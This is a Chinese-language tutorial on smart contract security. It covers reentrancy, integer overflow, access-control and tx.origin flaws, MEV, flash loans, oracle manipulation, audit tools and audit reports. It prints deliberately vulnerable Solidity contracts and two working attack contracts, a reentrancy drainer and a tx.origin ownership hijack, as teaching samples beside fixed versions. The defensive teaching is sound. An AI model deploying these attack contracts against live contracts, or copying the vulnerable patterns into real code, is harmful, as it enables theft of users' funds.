# 智能合约安全实战

![status](https://img.shields.io/badge/ 状态 - 已完成 - success)
![author](https://img.shields.io/badge/ 作者 - beihaili-blue)
![date](https://img.shields.io/badge/ 日期 - 2025--06-orange)
![difficulty](https://img.shields.io/badge/ 难度 - 高级 - red)

> 💡 智能合约一旦部署就无法修改，而它管理的往往是真金白银。一个小小的漏洞可能导致数百万美元的损失。本课将带你深入了解真实世界中最常见的智能合约漏洞，学会如何编写安全的 Solidity 代码，并掌握基本的审计方法与工具。欢迎关注作者 [Twitter](https://twitter.com/bhbtc1337)、加入 [交流群](https://forms.gle/QMBwL6LwZyQew1tX8)、或在 [GitHub](https://github.com/beihaili/Get-Started-with-Web3) 上贡献内容。

## 目录

- [前言](# 前言)
- [常见漏洞类型](# 常见漏洞类型)
  - [重入攻击 (Reentrancy)](# 重入攻击 - reentrancy)
  - [整数溢出与下溢 (Integer Overflow/Underflow)](# 整数溢出与下溢 - integer-overflowunderflow)
  - [权限控制漏洞](# 权限控制漏洞)
  - [其他常见漏洞](# 其他常见漏洞)
- [安全开发最佳实践](# 安全开发最佳实践)
- [自动化审计工具](# 自动化审计工具)
- [如何阅读审计报告](# 如何阅读审计报告)
- [总结](# 总结)
- [延伸阅读](# 延伸阅读)

## 前言

### 为什么智能合约安全如此重要？

传统软件出了 bug 可以打补丁、发新版本。但智能合约不同 —— 它部署在区块链上之后，代码就永远无法更改。更关键的是，智能合约直接掌管着用户的资金，攻击者不需要入侵服务器、不需要社会工程学，只需要找到代码中的一个逻辑漏洞，就能在一笔交易中卷走所有资金。

**DeFi 攻击历史触目惊心：**

| 事件 | 时间 | 损失金额 | 漏洞类型 |
|------|------|----------|----------|
| The DAO | 2016 年 | ~6000 万美元 | 重入攻击 |
| Parity 钱包 | 2017 年 | ~1.5 亿美元 | 权限控制 |
| bZx 闪电贷攻击 | 2020 年 | ~800 万美元 | 预言机操纵 |
| Ronin Bridge | 2022 年 | ~6.2 亿美元 | 私钥泄露 |
| Euler Finance | 2023 年 | ~1.97 亿美元 | 逻辑漏洞 |

据统计，自 DeFi 兴起以来，因智能合约漏洞和安全事件造成的累计损失已超过 ** 数十亿美元 **。

### 本课目标

学完本课，你将能够：

1. ** 识别 ** 最常见的智能合约漏洞类型
2. ** 编写 ** 遵循安全最佳实践的 Solidity 代码
3. ** 使用 ** Slither、Mythril 等自动化工具进行初步审计
4. ** 阅读 ** 专业安全审计报告并理解其中的发现

## 常见漏洞类型

### 重入攻击 (Reentrancy)

重入攻击是智能合约历史上最著名、最具破坏力的漏洞类型。2016 年 The DAO 事件中，攻击者利用重入漏洞盗走了约 6000 万美元的 ETH，最终导致以太坊社区分裂，硬分叉出了 Ethereum Classic (ETC)。

** 原理：** 当合约 A 向合约 B 发送 ETH 时，会触发合约 B 的 `receive ()` 或 `fallback ()` 函数。如果合约 A 在发送 ETH ** 之后 ** 才更新状态（比如扣减余额），那么合约 B 可以在回调函数中 ** 再次调用 ** 合约 A 的提款函数 —— 此时余额还没被扣减，于是可以反复提款。

** 漏洞代码示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 有重入漏洞的保险库合约
/// @notice 这是一个反面教材，请勿在生产环境使用
contract VulnerableVault {
    mapping (address => uint256) public balances;

    /// @notice 用户存入 ETH
    function deposit () external payable {
        balances [msg.sender] += msg.value;
    }

    /// @notice 用户提取全部余额 —— 存在重入漏洞！
    function withdraw () external {
        uint256 amount = balances [msg.sender];
        require (amount > 0, "No balance");

        // 危险：先发送 ETH，再更新状态
        (bool success, ) = msg.sender.call {value: amount}("");
        require (success, "Transfer failed");

        // 此行在回调中被绕过 —— 攻击者反复调用 withdraw ()
        // 时，balances 还没被清零
        balances [msg.sender] = 0;
    }
}
```

** 攻击合约：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit () external payable;
    function withdraw () external;
}

/// @title 重入攻击合约
contract Attacker {
    IVulnerableVault public vault;
    address public owner;

    constructor (address _vault) {
        vault = IVulnerableVault (_vault);
        owner = msg.sender;
    }

    /// @notice 发起攻击：先存入 1 ETH，然后提款触发重入
    function attack () external payable {
        require (msg.value >= 1 ether, "Need at least 1 ETH");
        vault.deposit {value: 1 ether}();
        vault.withdraw ();
    }

    /// @notice 每次收到 ETH 时自动触发，反复调用 withdraw
    receive () external payable {
        if (address (vault).balance >= 1 ether) {
            vault.withdraw (); // 重入！此时 balances 尚未清零
        }
    }

    /// @notice 攻击者取回所有盗取的资金
    function collectStolenFunds () external {
        require (msg.sender == owner);
        payable (owner).transfer (address (this).balance);
    }
}
```

** 修复后的安全代码：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/// @title 安全的保险库合约
/// @notice 使用 Checks-Effects-Interactions 模式 + ReentrancyGuard
contract SecureVault is ReentrancyGuard {
    mapping (address => uint256) public balances;

    function deposit () external payable {
        balances [msg.sender] += msg.value;
    }

    /// @notice 安全的提款函数
    function withdraw () external nonReentrant {
        uint256 amount = balances [msg.sender];
        require (amount > 0, "No balance");          // Checks: 检查条件

        balances [msg.sender] = 0;                   // Effects: 先更新状态

        (bool success, ) = msg.sender.call {value: amount}(""); // Interactions: 最后外部调用
        require (success, "Transfer failed");
    }
}
```

** 防御要点：**

1. **Checks-Effects-Interactions 模式 **：先检查条件 → 再更新状态 → 最后进行外部调用
2. ** 使用 OpenZeppelin ReentrancyGuard**：通过 `nonReentrant` 修饰符添加互斥锁
3. ** 避免使用 `call` 发送大额资金时不加保护 **

### 整数溢出与下溢 (Integer Overflow/Underflow)

在 Solidity 0.8 之前，整数运算不会自动检查溢出。一个 `uint8` 类型的变量值为 255 时，加 1 会变成 0（溢出）；值为 0 时，减 1 会变成 255（下溢）。这在 DeFi 中可能导致灾难性后果 —— 比如余额从 0 突然变成天文数字。

**Solidity 0.8 之前的危险行为：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // 注意：0.8 之前的版本

/// @title 有整数溢出漏洞的代币合约
/// @notice 这是反面教材，展示 0.8 之前的危险行为
contract VulnerableToken {
    mapping (address => uint256) public balances;
    uint256 public totalSupply;

    constructor (uint256 _initialSupply) {
        balances [msg.sender] = _initialSupply;
        totalSupply = _initialSupply;
    }

    /// @notice 转账函数 —— 存在下溢漏洞
    function transfer (address _to, uint256 _value) public {
        // 在 0.8 之前，如果 balances [msg.sender] = 0 而 _value = 1，
        // 那么 0 - 1 不会 revert，而是变成 2^256 - 1（一个天文数字）
        require (balances [msg.sender] - _value >= 0); // 这个检查永远为 true！
        balances [msg.sender] -= _value;  // 下溢：余额变成超大数字
        balances [_to] += _value;
    }
}
```

**SafeMath 的历史作用：**

在 Solidity 0.8 之前，开发者使用 OpenZeppelin 的 SafeMath 库来防止溢出：

```solidity
// Solidity 0.8 之前的解决方案
import "@openzeppelin/contracts/math/SafeMath.sol";

contract SafeToken {
    using SafeMath for uint256;

    mapping (address => uint256) public balances;

    function transfer (address _to, uint256 _value) public {
        // SafeMath 会在溢出时自动 revert
        balances [msg.sender] = balances [msg.sender].sub (_value);
        balances [_to] = balances [_to].add (_value);
    }
}
```

**Solidity 0.8+ 的改进：**

从 Solidity 0.8 开始，编译器 ** 默认 ** 会检查所有算术运算的溢出，溢出时自动 `revert`。但要注意 `unchecked` 块：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ModernToken {
    mapping (address => uint256) public balances;

    function transfer (address _to, uint256 _value) public {
        // 0.8+ 默认安全：如果余额不足会自动 revert
        balances [msg.sender] -= _value;
        balances [_to] += _value;
    }

    /// @notice unchecked 块会跳过溢出检查 —— 使用时必须格外小心
    function riskyIncrement (uint256 x) public pure returns (uint256) {
        unchecked {
            return x + 1; // 如果 x = type (uint256).max，会溢出为 0！
        }
    }
}
```

** 注意事项：**
- Solidity 0.8+ 的 `unchecked` 块通常用于节省 gas（比如循环计数器 `i++`），但 ** 绝不能 ** 对用户输入的数据使用 `unchecked`
- 审计时要特别关注 `unchecked` 块中的算术运算
- 如果项目中混合使用 0.7 和 0.8 版本的合约，要格外注意版本差异

### 权限控制漏洞

权限控制是智能合约安全的基石。如果关键函数缺少适当的访问控制，任何人都可以调用管理员才能执行的操作，比如铸造代币、转移资金、暂停合约等。

**2017 年 Parity 钱包事件：** 由于初始化函数缺少访问控制，攻击者调用了多签钱包库合约的 `initWallet ()` 函数让自己成为了所有者，然后将库合约自毁（`selfdestruct`），导致所有依赖该库的钱包中的 ETH ** 永久锁死 **，损失约 1.5 亿美元。

** 漏洞代码 —— 缺少权限检查：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 有权限漏洞的代币合约
contract VulnerableAdmin {
    mapping (address => uint256) public balances;
    address public owner;

    constructor () {
        owner = msg.sender;
    }

    /// @notice 铸造新代币 —— 任何人都能调用！
    function mint (address _to, uint256 _amount) external {
        // 缺少 onlyOwner 检查 —— 这是一个严重漏洞
        balances [_to] += _amount;
    }

    /// @notice 紧急提取所有资金 —— 同样没有权限控制
    function emergencyWithdraw () external {
        payable (msg.sender).transfer (address (this).balance);
    }
}
```

**tx.origin 与 msg.sender 的陷阱：**

`tx.origin` 是交易的最初发起者（永远是一个 EOA 外部账户），而 `msg.sender` 是直接调用者（可以是合约）。使用 `tx.origin` 进行权限控制是一个经典陷阱：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title tx.origin 权限漏洞示例
contract TxOriginVictim {
    address public owner;

    constructor () {
        owner = msg.sender;
    }

    /// @notice 危险！使用 tx.origin 进行身份验证
    function transferOwnership (address _newOwner) external {
        // 如果 owner 调用了恶意合约，恶意合约再调用此函数，
        //tx.origin 仍然是 owner，检查会通过！
        require (tx.origin == owner, "Not owner");
        owner = _newOwner;
    }
}

/// @title 利用 tx.origin 的攻击合约
contract TxOriginAttacker {
    TxOriginVictim public victim;
    address public attacker;

    constructor (address _victim) {
        victim = TxOriginVictim (_victim);
        attacker = msg.sender;
    }

    /// @notice 当 owner 向此合约发送 ETH 时触发攻击
    receive () external payable {
        //tx.origin 是 owner（因为 owner 发起了这笔交易）
        //msg.sender 是本合约（但 victim 检查的是 tx.origin）
        victim.transferOwnership (attacker);
    }
}
```

** 修复后的安全代码：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

/// @title 使用 OpenZeppelin 的安全权限管理
contract SecureAdmin is AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256 ("MINTER_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256 ("PAUSER_ROLE");

    mapping (address => uint256) public balances;

    constructor (address admin) {
        _grantRole (DEFAULT_ADMIN_ROLE, admin);
        _grantRole (MINTER_ROLE, admin);
    }

    /// @notice 只有 MINTER_ROLE 可以铸造
    function mint (address _to, uint256 _amount) external onlyRole (MINTER_ROLE) {
        balances [_to] += _amount;
    }

    /// @notice 只有管理员可以紧急提取
    function emergencyWithdraw () external onlyRole (DEFAULT_ADMIN_ROLE) {
        payable (msg.sender).transfer (address (this).balance);
    }
}
```

** 权限控制的核心原则：**
- 永远使用 `msg.sender` 而不是 `tx.origin` 做身份验证
- 使用 OpenZeppelin 的 `Ownable` 或 `AccessControl` 进行角色管理
- 关键操作（铸币、暂停、升级、资金提取）必须有严格的权限守卫
- 考虑使用 ** 多签 (Multisig)** 和 ** 时间锁 (Timelock)** 保护最高权限

### 其他常见漏洞

除了上述三大经典漏洞，还有几类在 DeFi 中频繁出现的攻击向量：

** 前端运行 / MEV (Front-running)：**

在以太坊中，用户的交易在被打包进区块之前会先进入公开的交易池（mempool）。矿工或 MEV Bot 可以看到你的交易内容，然后在你的交易之前插入自己的交易获利。

```
用户提交大额 Swap 交易 → 进入 mempool（公开可见）
    ↓
MEV Bot 发现机会 → 在用户交易之前买入（推高价格）
    ↓
用户交易执行 → 以更高价格成交
    ↓
MEV Bot 卖出获利 → "三明治攻击" 完成
```

防御手段：使用 Flashbots Protect、设置合理的 slippage tolerance、或使用 commit-reveal 方案。

** 闪电贷攻击 (Flash Loan Attack)：**

闪电贷是 DeFi 独有的创新 —— 在一笔交易中借入巨额资金、执行操作、然后归还，全程无需抵押。攻击者利用闪电贷瞬间获得巨大的资金杠杆，操纵市场价格或利用协议逻辑漏洞获利。

```
1. 攻击者从 Aave/dYdX 闪电贷借入 1000 万 USDC
2. 用大额资金操纵某个 DEX 的代币价格
3. 以被操纵的价格在目标协议中获利
4. 归还闪电贷 + 手续费
5. 攻击者净赚差价
```

** 预言机操纵 (Oracle Manipulation)：**

许多 DeFi 协议依赖预言机获取外部价格数据。如果协议直接使用单一 DEX 的即时价格（现货价格）作为预言机，攻击者可以通过闪电贷操纵该 DEX 的价格来欺骗协议。

防御手段：使用 Chainlink 等去中心化预言机、采用 TWAP（时间加权平均价格）、多源聚合报价。

## 安全开发最佳实践

遵循以下实践可以大幅降低合约漏洞风险：

### 1. 最小权限原则

每个函数、每个角色只应拥有完成其任务所需的 ** 最小权限 **。管理员的权力越大，合约被攻击后的损失就越大。

### 2. Checks-Effects-Interactions 模式

这是 Solidity 开发中最重要的设计模式：

```solidity
function safeOperation () external {
    // 1. Checks —— 所有条件检查放在最前面
    require (balances [msg.sender] >= amount, "Insufficient balance");
    require (amount > 0, "Amount must be positive");

    // 2. Effects —— 更新所有状态变量
    balances [msg.sender] -= amount;
    totalWithdrawn += amount;

    // 3. Interactions —— 最后才进行外部调用
    (bool success, ) = msg.sender.call {value: amount}("");
    require (success, "Transfer failed");
}
```

### 3. 使用经过审计的开源库

** 不要重新发明轮子。** OpenZeppelin Contracts 是行业标准，经过多轮审计和社区验证：

- `ReentrancyGuard` — 防重入
- `Ownable` / `AccessControl` — 权限管理
- `Pausable` — 紧急暂停
- `SafeERC20` — 安全的 ERC-20 交互

### 4. 编写全面的测试

测试是安全的第一道防线。好的测试应该覆盖：

- 正常路径（happy path）
- 边界条件（零值、最大值、空地址）
- 权限检查（非授权用户应该被拒绝）
- 攻击场景（重入、溢出等）
- Fuzz testing（随机输入发现意外行为）

### 5. 代码审查清单

每次提交合约代码时，对照以下清单逐项检查：

- [ ] 所有外部调用都在状态更新 ** 之后 ** 吗？（Checks-Effects-Interactions）
- [ ] 关键函数是否有适当的访问控制修饰符？
- [ ] 是否使用了 `tx.origin` 做身份验证？（应该用 `msg.sender`）
- [ ] `unchecked` 块中是否有用户可控的输入？
- [ ] 外部合约调用的返回值是否都被检查了？
- [ ] 循环中是否有可能因 gas 耗尽而 revert 的操作？
- [ ] 合约是否正确处理了 ETH 和 ERC-20 的发送失败？
- [ ] 是否有合适的事件 (event) 记录关键操作？
- [ ] 是否考虑了合约升级和紧急暂停机制？
- [ ] 所有 `public` / `external` 函数都是有意暴露的吗？

## 自动化审计工具

手动审计是不可替代的，但自动化工具可以快速发现常见漏洞，是安全流程中不可缺少的一环。

### Slither — 静态分析利器

Slither 是由 Trail of Bits 开发的 Solidity 静态分析框架，速度快、误报率低，是最常用的审计工具之一。

** 安装与运行：**

```bash
# 安装 Slither
pip install slither-analyzer

# 对单个合约文件运行分析
slither contracts/MyContract.sol

# 对 Foundry/Hardhat 项目运行
slither .

# 只显示高危和中危问题
slither . --filter-paths "node_modules" --exclude-informational --exclude-low
```

** 输出解读示例：**

```
MyContract.withdraw (uint256) (contracts/MyContract.sol#45-52)
  sends eth to arbitrary user
  Dangerous calls:
    - (success) = msg.sender.call {value: amount}() (contracts/MyContract.sol#50)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations

INFO:Detectors:
Reentrancy in MyContract.withdraw (uint256) (contracts/MyContract.sol#45-52):
  External calls:
    - (success) = msg.sender.call {value: amount}() (#50)
  State variables written after the call:
    - balances [msg.sender] = 0 (#51)
```

Slither 会明确指出：哪个函数、哪一行、什么类型的风险，并附上参考文档链接。

### Mythril — 符号执行引擎

Mythril 使用符号执行和约束求解来发现深层漏洞，适合捕捉复杂的逻辑问题。

```bash
# 安装 Mythril
pip install mythril

# 分析合约
myth analyze contracts/MyContract.sol

# 指定 Solidity 版本
myth analyze contracts/MyContract.sol --solv 0.8.20

# 设置更深的搜索深度（耗时更长，发现更多）
myth analyze contracts/MyContract.sol --execution-timeout 300
```

Mythril 会尝试构造 ** 真实的攻击路径 **：如果它发现一条可以导致资金损失的交易序列，会直接输出该序列。

### Foundry Fuzz Testing — 模糊测试

Foundry 内置的 fuzz testing 功能可以用随机输入自动测试合约，是发现边界情况的利器：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/SecureVault.sol";

contract SecureVaultFuzzTest is Test {
    SecureVault vault;
    address user = address (0x1);

    function setUp () public {
        vault = new SecureVault ();
    }

    /// @notice Fuzz 测试：存入任意金额后，余额应该正确
    function testFuzz_DepositUpdatesBalance (uint96 amount) public {
        vm.assume (amount > 0); // 排除零值
        vm.deal (user, amount);
        vm.prank (user);
        vault.deposit {value: amount}();
        assertEq (vault.balances (user), amount);
    }

    /// @notice Fuzz 测试：不能提取超过余额的金额
    function testFuzz_CannotWithdrawMoreThanBalance (uint96 depositAmt) public {
        vm.assume (depositAmt > 0);
        vm.deal (user, depositAmt);
        vm.prank (user);
        vault.deposit {value: depositAmt}();

        // 余额正确
        assertEq (vault.balances (user), depositAmt);

        // 提取后余额归零
        vm.prank (user);
        vault.withdraw ();
        assertEq (vault.balances (user), 0);
    }

    /// @notice Fuzz 测试：没有存款的用户不能提取
    function testFuzz_NoBalanceCannotWithdraw (address randomUser) public {
        vm.assume (randomUser != address (0));
        vm.assume (vault.balances (randomUser) == 0);
        vm.prank (randomUser);
        vm.expectRevert ("No balance");
        vault.withdraw ();
    }
}
```

** 运行 fuzz test：**

```bash
# 运行所有 fuzz 测试（默认 256 轮随机输入）
forge test --match-contract SecureVaultFuzzTest

# 增加随机轮数以获得更高覆盖率
forge test --match-contract SecureVaultFuzzTest --fuzz-runs 10000

# 查看详细输出
forge test --match-contract SecureVaultFuzzTest -vvvv
```

### 工具对比

| 特性 | Slither | Mythril | Foundry Fuzz |
|------|---------|---------|--------------|
| 分析方法 | 静态分析 | 符号执行 | 模糊测试 |
| 速度 | 极快（秒级） | 较慢（分钟级） | 中等 |
| 擅长发现 | 常见模式漏洞 | 复杂逻辑漏洞 | 边界条件问题 |
| 误报率 | 低 | 中 | 极低 |
| 学习曲线 | 低 | 中 | 低 |
| 最佳使用场景 | CI/CD 集成，快速扫描 | 深度分析关键合约 | 开发阶段持续测试 |
| 安装 | `pip install slither-analyzer` | `pip install mythril` | 内置于 Foundry |

** 最佳实践：** 三种工具结合使用。开发时用 Foundry fuzz testing 持续测试，提交前用 Slither 快速扫描，关键合约上线前用 Mythril 做深度分析。

## 如何阅读审计报告

无论你是开发者还是用户，阅读审计报告的能力都至关重要。对开发者来说，它帮助你理解和修复问题；对用户来说，它帮助你评估一个协议是否值得信任。

### 审计报告的标准结构

一份专业的审计报告通常包含以下部分：

1. **Executive Summary（摘要）**：项目概述、审计范围、关键发现统计
2. **Scope（审计范围）**：审计了哪些合约、哪个 commit、使用了什么工具
3. **Findings（发现）**：按严重程度排列的所有问题
4. **Recommendations（建议）**：针对每个问题的修复建议
5. **Appendix（附录）**：工具输出、测试覆盖率等补充信息

### 严重程度分级

审计发现按以下标准分为五个等级：

| 等级 | 含义 | 示例 |
|------|------|------|
| **Critical** | 可直接导致资金损失 | 重入攻击、权限绕过 |
| **High** | 严重影响协议功能或安全 | 价格操纵、逻辑错误 |
| **Medium** | 可能在特定条件下造成损害 | 缺少事件日志、边界未检查 |
| **Low** | 最佳实践偏差，风险较小 | gas 优化、代码风格 |
| **Informational** | 建议性改进，无安全风险 | 注释缺失、命名不规范 |

### 解读真实审计报告示例

以下是一个简化的审计发现条目，展示专业报告的写法：

```
[H-01] 提款函数存在重入风险

严重程度: High
状态：已确认 (Confirmed)

描述:
    Vault.sol 第 45 行的 withdraw () 函数在外部调用（第 50 行）之后
    才更新用户余额状态（第 51 行），违反了 Checks-Effects-Interactions
    模式。恶意合约可以在 receive () 回调中重复调用 withdraw ()，在单笔
    交易中提取超过其余额的资金。

影响:
    攻击者可以提取合约中的全部 ETH 余额。截至审计时，合约持有 1,250 ETH
    （约 400 万美元）。

复现步骤:
    1. 部署攻击合约，实现 receive () 中回调 withdraw ()
    2. 调用 deposit () 存入 1 ETH
    3. 调用 withdraw () 触发重入循环
    4. 预期结果：攻击者获得远超 1 ETH 的资金

建议修复:
    - 将 balances [msg.sender] = 0 移至外部调用之前
    - 添加 OpenZeppelin ReentrancyGuard 的 nonReentrant 修饰符
```

** 阅读审计报告时的关键问题：**

1. **Critical 和 High 级别的发现是否都已修复？** 如果还有未修复的高危问题，应极其谨慎
2. ** 审计覆盖了全部合约代码吗？** 注意审计范围之外的合约
3. ** 审计之后代码是否有改动？** 审计报告只对特定 commit 有效
4. ** 审计机构的声誉如何？** Trail of Bits、OpenZeppelin、Consensys Diligence、Spearbit 等是业内知名机构

## 总结

智能合约安全不是可选的附加项，而是 Web3 开发的 ** 核心要求 **。回顾本课的关键要点：

### 核心漏洞类型
- ** 重入攻击 **：永远遵循 Checks-Effects-Interactions 模式，关键函数加 `nonReentrant`
- ** 整数溢出 **：使用 Solidity 0.8+，谨慎使用 `unchecked` 块
- ** 权限控制 **：使用 `msg.sender` 而非 `tx.origin`，善用 OpenZeppelin AccessControl

### 安全开发流程
- 使用经过审计的 OpenZeppelin 库，不要重复造轮子
- 编写全面的测试（包括 fuzz testing 和攻击场景模拟）
- 每次提交代码时对照安全清单检查
- 使用 Slither + Mythril + Foundry fuzz 三层防护
- 上线前请专业团队进行安全审计

### 安全意识
- 智能合约安全是一个 ** 持续学习 ** 的过程 —— 新的攻击向量不断出现
- 参与 CTF 竞赛（如 Damn Vulnerable DeFi）是提升实战能力的最好方式
- 阅读 Rekt.news 上的真实攻击分析，从历史中学习

> 安全不是目的地，而是旅程。每一个 DeFi 开发者都有责任让这个生态变得更安全。

## 延伸阅读

- [SWC Registry](https://swcregistry.io/) — 智能合约弱点分类标准，涵盖所有已知漏洞类型
- [OpenZeppelin Contracts](https://docs.openzeppelin.com/contracts/5.x/) — 安全最佳实践与经过审计的合约库
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) — 智能合约安全 CTF 练习平台，强烈推荐
- [Rekt.news](https://rekt.news/) — DeFi 安全事件新闻与深度分析
- [Consensys 智能合约最佳实践](https://consensys.github.io/smart-contract-best-practices/) — 全面的安全开发指南
- [Foundry Book](https://book.getfoundry.sh/) — Foundry 官方文档，包含 fuzz testing 教程

---

<div align="center">
<a href="https://github.com/beihaili/Get-Started-with-Web3">🏠 返回主页 </a> |
<a href="https://twitter.com/bhbtc1337">🐦 关注作者 </a> |
<a href="https://forms.gle/QMBwL6LwZyQew1tX8">📝 加入交流群 </a>
</div>
